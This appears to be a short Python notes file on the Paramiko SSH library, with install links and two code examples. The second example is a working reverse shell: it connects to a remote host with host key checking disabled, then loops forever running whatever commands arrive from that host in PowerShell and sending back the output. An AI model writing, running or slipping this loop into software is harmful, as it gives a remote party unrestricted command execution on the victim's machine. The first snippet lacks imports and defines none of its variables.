# Paramiko is a pure-Python (3.6+) implementation of the SSHv2 protocol

# https://pypi.org/project/paramiko/
# https://docs.paramiko.org/en/latest/
# https://www.paramiko.org/installing.html

# pip install paramiko

# For example:

# Connect
client = SSHClient()
client.connect(host, port, username)
# Obtain session
session = client.get_transport().open_session()
# Forward local agent
AgentRequestHandler(session)

session.exec_command("git clone https://my.git.repository/")


# example 2
import paramiko
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    client.invoke_shell()

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
    print(ssh_session.recv(1024).decode())

    while True:
        command = ssh_session.recv(1024) 
        cmd = command.decode()
        cmd_output = subprocess.run(['powershell', '-command', cmd], stdout=subprocess.PIPE, text=True)
        ssh_session.send(cmd_output.stdout or 'None')
